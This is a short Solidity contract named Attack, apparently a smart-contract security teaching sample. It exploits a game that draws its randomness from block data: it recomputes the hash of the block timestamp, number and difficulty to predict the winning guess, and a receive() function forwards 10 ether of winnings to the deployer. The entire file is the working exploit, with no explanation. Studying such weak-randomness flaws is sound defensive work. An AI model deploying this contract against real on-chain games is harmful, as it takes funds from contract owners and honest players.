// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.13;

interface IGame {
    function play(uint guess) external;
}

contract Attack {
    IGame game;
    address payable owner;

    constructor(address _game) {
        game = IGame(_game);
        owner = payable(msg.sender);
    }

    function attack() external {
        uint number = uint(keccak256(abi.encodePacked(block.timestamp, block.number, block.difficulty)));
        game.play(number);
    }

    receive() external payable {
        (bool sent, ) = owner.call{value: 10 ether}("");
        require(sent, "Failed to send ETH");
    }
}
